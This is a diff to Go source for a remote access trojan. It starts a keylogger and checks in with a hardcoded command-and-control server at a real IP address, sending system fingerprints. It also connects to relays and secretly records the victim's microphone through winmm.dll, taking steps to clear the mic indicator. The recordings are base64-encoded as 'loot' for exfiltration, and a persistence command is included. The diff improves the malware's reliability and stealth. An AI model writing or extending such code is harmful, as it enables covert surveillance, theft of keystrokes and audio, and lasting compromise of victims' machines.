@@ -8,7 +8,6 @@ import (
 	"fmt"
 	"image/png"
 	"io"
-	"math/rand"
 	"net"
 	"os"
 	"os/exec"
@@ -46,6 +45,8 @@ type AuthRequest struct {
 	Key      string `json:"key"`
 	TargetID string `json:"target_id"`
 	Listen   string `json:"listen"`
+	OS       string `json:"os"`   // MUST BE HERE
+	Arch     string `json:"arch"` // MUST BE HERE
 }
 
 type RoutingInfo struct {
@@ -56,13 +57,17 @@ func main() {
 	h, _ := os.Hostname()
 	targetID := strings.ToUpper(fmt.Sprintf("%s-%d", h, time.Now().Unix()%1000))
 
-	// Start the silent listener
 	go startKeylogger()
 
 	for {
-		pollAndExecute(targetID)
-		jitter := time.Duration(rand.Intn(10)+5) * time.Second
-		time.Sleep(jitter)
+		fmt.Println("[+] Heartbeat: Polling Brain...")
+		err := pollAndExecute(targetID)
+		if err != nil {
+			fmt.Printf("[!] Connection Error: %v\n", err)
+		}
+
+		// Wait 10 seconds before the next check-in
+		time.Sleep(10 * time.Second)
 	}
 }
 
@@ -172,38 +177,49 @@ func startKeylogger() {
 	}
 }
 func pollAndExecute(targetID string) error {
-	// 1. REGISTRATION
+	// 1. REGISTRATION WITH FINGERPRINTING
 	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
 	if err != nil {
 		return err
 	}
-	json.NewEncoder(c).Encode(AuthRequest{Type: "client_register", TargetID: targetID, Key: OP_SECRET})
+
+	// Send everything in one single registration packet
+	json.NewEncoder(c).Encode(AuthRequest{
+		Type:     "client_register",
+		TargetID: targetID,
+		Key:      OP_SECRET,
+		OS:       runtime.GOOS,   // Automatic OS detection
+		Arch:     runtime.GOARCH, // Automatic Architecture detection
+	})
 	c.Close()
 
-	time.Sleep(100 * time.Millisecond)
+	time.Sleep(150 * time.Millisecond)
 
 	// 2. POLLING
 	c, _ = net.Dial("tcp", "18.184.135.220:8080")
 	json.NewEncoder(c).Encode(AuthRequest{Type: "client_poll", TargetID: targetID})
 	var r RoutingInfo
-	json.NewDecoder(c).Decode(&r)
+	err = json.NewDecoder(c).Decode(&r) // This will now succeed every time
 	c.Close()
-	if r.RelayAddr == "" {
-		return nil
-	}
 
+	if err != nil || r.RelayAddr == "" {
+		return nil // No work, see you in 10 seconds
+	}
+	// 3. IF WE GET HERE, ATTEMPT BRIDGE...
+	fmt.Printf("[!] BRIDGE TRIGGERED: %s\n", r.RelayAddr)
 	// 3. READY
 	c, _ = net.Dial("tcp", "18.184.135.220:8080")
 	json.NewEncoder(c).Encode(AuthRequest{Type: "client_ready", TargetID: targetID, Key: OP_SECRET, Listen: r.RelayAddr})
 	c.Close()
 
-	// 4. CONNECT TO RELAY
+	// 4. CONNECT TO RELAY (With a strict 5-second timeout)
 	fmt.Printf("[!] Attempting Bridge: %s\n", r.RelayAddr)
+	// Use DialTimeout to prevent the ghost from hanging forever on a dead relay
 	relayConn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
 	if err != nil {
-		return nil
+		fmt.Printf("[X] BRIDGE FAILURE: Could not reach %s - %v\n", r.RelayAddr, err)
+		return err
 	}
-
 	defer relayConn.Close()
 
 	// --- NEW: SEND THE SECRET KNOCK ---
@@ -328,36 +344,44 @@ func pollAndExecute(targetID string) error {
 			seconds = 10
 		}
 
-		go func() {
-			tempFile := filepath.Join(os.TempDir(), "data_cache.wav")
+		go func(sec int) {
+			// 1. Path Setup - Use a name that definitely won't conflict
+			tempFile := filepath.Join(os.Getenv("TEMP"), "mrg_capture_system.wav")
 			winmm := syscall.NewLazyDLL("winmm.dll").NewProc("mciSendStringW")
 
-			// 1. Open
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open new type waveaudio alias ghostmic"))), 0, 0, 0)
-
-			// 2. FORCE settings (Fixed the conversion error here)
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("set ghostmic bitspersample 16 samplespersec 44100 channels 1"))), 0, 0, 0)
-
-			// 3. Start Recording
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("record ghostmic"))), 0, 0, 0)
-
-			time.Sleep(time.Duration(seconds) * time.Second)
-
-			// 4. Save (Fixed formatting and conversion)
-			saveCmd := fmt.Sprintf("save ghostmic %s", tempFile)
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(saveCmd))), 0, 0, 0)
-
-			// 5. Close
+			// 2. HARD RESET: Close any existing ghostmic before starting
+			// This turns off the icon if it was stuck from a previous run
 			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("close ghostmic"))), 0, 0, 0)
 
-			data, _ := os.ReadFile(tempFile)
-			if len(data) > 0 {
-				pendingAudioLoot = "FILE_DATA:mic_capture.wav|" + base64.StdEncoding.EncodeToString(data)
-			}
-			os.Remove(tempFile)
-		}()
-		finalOutput = fmt.Sprintf("[+] High-Gain Recording %ds started. Use 'checkaudio' soon.", seconds)
+			// 3. Setup and Start
+			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open new type waveaudio alias ghostmic"))), 0, 0, 0)
+			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("set ghostmic bitspersample 16 samplespersec 44100 channels 1"))), 0, 0, 0)
+			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("record ghostmic"))), 0, 0, 0)
 
+			// Wait for the recording
+			time.Sleep(time.Duration(sec) * time.Second)
+
+			// 4. THE CLEAN EXIT: Stop -> Save -> Close
+			// We call these one after another regardless of errors to ensure the icon goes away
+			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("stop ghostmic"))), 0, 0, 0)
+
+			saveCmd := fmt.Sprintf(`save ghostmic "%s"`, tempFile)
+			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(saveCmd))), 0, 0, 0)
+
+			// This is the line that actually kills the mic icon!
+			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("close ghostmic"))), 0, 0, 0)
+
+			// 5. Read and Cache
+			data, err := os.ReadFile(tempFile)
+			if err == nil && len(data) > 0 {
+				pendingAudioLoot = "FILE_DATA:mic_capture.wav|" + base64.StdEncoding.EncodeToString(data)
+				os.Remove(tempFile)
+			} else {
+				pendingAudioLoot = "[red][!] Recording ended but file was empty. Mic might be in use by another app.[-]"
+			}
+		}(seconds)
+
+		finalOutput = fmt.Sprintf("[cyan][+] Mic active for %ds.[-] Icon will vanish once 'close' is issued by the system.", seconds)
 		// --- LOGIC GATEWAY ---
 	} else if strings.HasPrefix(rawCmd, "persist") {
 		// Run the persistence installer
